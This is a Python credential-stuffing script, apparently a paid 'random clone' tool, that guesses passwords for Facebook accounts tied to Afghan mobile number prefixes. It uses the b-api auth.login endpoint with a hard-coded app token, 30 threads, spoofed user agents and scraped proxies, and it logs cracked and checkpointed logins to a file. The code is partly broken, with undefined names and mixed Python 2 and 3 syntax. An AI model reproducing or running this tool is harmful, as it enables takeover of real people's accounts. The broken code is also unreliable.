#coding=utf
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://mbasic.facebook.com/"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36"

uas_samsungse = "Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-S127DL) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.2 Chrome/87.0.4280.141 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-N981B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/99.0.4844.88 Mobile Safari/537.36"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

# lempankkkkkkkk

ugen2=[]

ugen=[]
try:

    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text

    open('.prox.txt','w').write(prox)

except Exception as e:
	

    exit(e)

    

for xd in range(10000):

    a='Mozilla/5.0 (Symbian/3; Series60/'

    b=random.randrange(1, 9)

    c=random.randrange(1, 9)

    d='Nokia'

    e=random.randrange(100, 9999)

    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'

    g=random.randrange(1, 9)

    h=random.randrange(1, 4)

    i=random.randrange(1, 4)

    j=random.randrange(1, 4)

    k='Mobile Safari/535.1'

    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')

    ugen2.append(uaku)

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['6','7','8','9','10','11','12'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

    
    
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/menu/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.user-agents.txt','r').read().splitlines()
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
os.system("xdg-open https://facebook.com/groups/866646547166175/")

logo ="""\033[1;97m
    '\033[1;35m' _____                   _____                       
 '\033[1;35m'/ ____|                 |  __ \                      
 \033[1;95m| (___  _   _ _ __ ______| |__) |____      _____ _ __ 
  \033[1;94m\___ \| | | | '_ \______|  ___/ _ \ \ /\ / / _ \ '__|
 \033[1;95m ____) | |_| | | | |     | |  | (_) \ V  V /  __/ |   
\033[1;95m |_____/ \__,_|_| |_|     |_|   \___/ \_/\_/ \___|_|   
                                 (>Welcome Sun-Power>)                                                                                                                                       
 '\033[1;33m'╭──────────•◈•──────────╮
 '\033[1;33m'-] TOOLS     :\031[1;32m Random
 '\033[1;33m'[-] VERSION   :\031[1;32m V.8.8.8 MAX
 '\033[1;33m'[-] AUTHOR    :\030[1;32m Azim-Khan
 '\033[1;33m'[-] GITHUB    :\0331[1;32m Nil-500
 '\033[1;33m'[-] TEAM      :\034[1;32m SUN-POWER
 '\033[1;33m'╰──────────•◈•──────────╯

\033[1;96m♧♧♧♧♧♧♧♧♧♧\033[1;91mWhatsapp\033[1;96m♧♧♧♧♧♧♧♧♧♧▒▒▒▒▒▒▒        
\033[1;91m:》》》\033[1;93m+8801914436101\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒
\033[1;97m==============================================================="""
os.system("clear")
print(logo)
def sex():
  uuid = str(os.geteuid()) + str(os.getlogin()) 
  id = "|".join(uuid)
  print("\n\n\x1b[32;1m  YOUR KEY : \033[94m"+id) 
  try: 
    httpCaht = requests.get("https://github.com/Nil500/Approval.txt/blob/menu/Approval.txt").text 
    if id in httpCaht: 
      print("\033[92m  YOUR KEY IS ACTIVE√........\033[97m")
      msg = str(os.geteuid()) 
      time.sleep(3) 
      pass 
    else: 
      print("\033[0;96m YOUR key IS NOT ACTIVE\n THIS TOOL IS PAID\n IF YOU BUY MY TOOL\n SO YOUR KEY COPY AND SEND ME MESSAGE ON WHATSAPP  ") 
      os.system('xdg-open https://wa.me/+8801914436101?text=*Hello*%2C%20*MR.Azim*%20*i*%20*want*%20*to*%20*buy*%20*your*%20*command*%20*Random*%20*clone*')
      time.sleep(3) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__menu__': 
     print (logo)
     sex() 
     
     
BLUE = '\033[1;32m'
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO ACTIVE APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR ACTIVE APPLICATION DETAILS:'%(H))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] {BLUE}SORRY NO EXPIRED APKS %s'%(N,M,N,M,N))
    else:
        print(f'\r[%s] {BLUE}YOUR EXPIRED APPLICATION DETAILS:'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
loop = 0
oks = []
cps = []
				
def menu ():
    os.system('clear')
    print (logo)
    print (logo)
    print (logo)            ('\x1b[1;93m[1]\x1b[1;93m START AFG FB CRACK')
    time.sleep(0.05)
    Select_menu ()


def Select_menu ():
    PROFAISOR =raw_input('\x1b[1;92m             Choose option :\x1b[1;92m ')
    if PROFAISOR == '':
        print ('[!] Fill In Correctly')
        Select_menu ()
        print ('\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY MOHAMMAD SULTANI')
        print ('\x1b[1;92m THISE SCRIPT CREATED BY MOHAMMAD SULTANI ')
        print ('\x1b[1;92m              FREE TOOL  AND   NO  ENCRYPT   ')
        print ('\x1b[1;92m\xe2\x96\xac')
        print (logo)
        print ('\x1b[1;93m \x1b[1;92m ETISALAT       : \x1b[1;92m 88,80,86,87,84,83,82,89,81')
        print (logo)
        print ('\x1b[1;93m \x1b[1;92m ROSHAN         : \x1b[1;92m 99,91,92,93,94,96,95,97,98')    
        print (logo)
        print ('\x1b[1;93m \x1b[1;92m MTN            : \x1b[1;92m 71.72.73.74.75.76.77.78.79')
        print (logo)
        print ('\x1b[1;93m \x1b[1;92m SALAM          : \x1b[1;92m 31.32.33.34.35.36.37.38.39')
        print (logo)
        print ('\x1b[1;93m \x1b[1;92m AWCC.          : \x1b[1;92m 01.02.03.04.05.06.07.08.09')
        print (logo)
        print ('\x1b[1;92m\xe2\x96\xac')
        
        try:
            c = raw_input('\x1b[1;92mChoose code :\x1b[1;92m ')
            print (logo)
            pas1 = raw_input('\x1b[1;92m     ENTER PASS1 :\x1b[1;92m ')
            pas2 = raw_input('\x1b[1;92m     ENTER PASS2 :\x1b[1;92m ')
            pas3 = raw_input('\x1b[1;92m     ENTER PASS3 :\x1b[1;92m ')
            print (logo)
            k = '07'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print ('[!] File Not Found')
            raw_input('\n[ Back ]')
            youtube()
        

    print ('\x1b[1;92m_')
    print (logo)
    xxx = str(len(id))
    Style_profaisor(' \x1b[1;93mTOTALL ID  NUMBER : \x1b[1;92m' + xxx)
    Style_profaisor(' \x1b[1;93mCODE YOU CHOOSE : \x1b[1;92m' + c)
    Style_profaisor(' \x1b[1;93mPLEASE WITH TO CRACK ID ')
    Style_profaisor(' \x1b[1;92mTo STOP PROCESS PRESS CTRL+Z')
    print  ('\x1b[1;92m_')
    print (logo)
    
    def menu (arg):
        user = arg
        
        try:
            os.mkdir('Nil')
        except OSError:
            pass

        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emenul=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print (' \x1b[1;92m[Nil_OK] ' + k + c + user + ' | ' + pass1)
                okb = open('Nil.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print (' \x1b[1;93m[Nil_CP] ' + k + c + user + ' | ' + pass1)
                cps = open('Nil.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emenul=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print (' \x1b[1;92m[Nil_OK] ' + k + c + user + ' | ' + pass2)
                    okb = open('Nil.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print (' \x1b[1;93m[Nil_CP] ' + k + c + user + ' | ' + pass2)
                    cps = open('Nil.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = pas1
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emenul=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print (' \x1b[1;92m[Nil_OK] ' + k + c + user + ' | ' + pass3)
                        okb = open('Nil.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print( ' \x1b[1;93m[Nil_CP] ' + k + c + user + ' | ' + pass3)
                        cps = open('Nil.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = pas2
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emenul=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print (' \x1b[1;92m[Nil_OK] ' + k + c + user + ' | ' + pass4)
                            okb = open('Nil.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print (' \x1b[1;93m[Nil_CP] ' + k + c + user + ' | ' + pass4)
                            cps = open('Nil.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = pas3
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&emenul=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print (' \x1b[1;92m[Nil_OK] ' + k + c + user + ' | ' + pass5)
                                okb = open('Nil.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print (' \x1b[1;93m[Nil_CP] ' + k + c + user + ' | ' + pass5)
                                cps = open('Nil.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(menu , id)
    print ('\x1b[1;92m_')
    print ('\x1b[1;92mThe Process has been Completed ...')
    
    print (' Cloned Accounts Has Been Saved : Nil.txt')
    print (' Note : Cp accounts Will Open after 8/10 days')
    print  ('\x1b[1;92m_')
    print (logo)
    raw_input('\x1b[1;93m Press enter to back ')
    menu ()


try:menu()
except Exception as e:exit(str(e))
sex() 
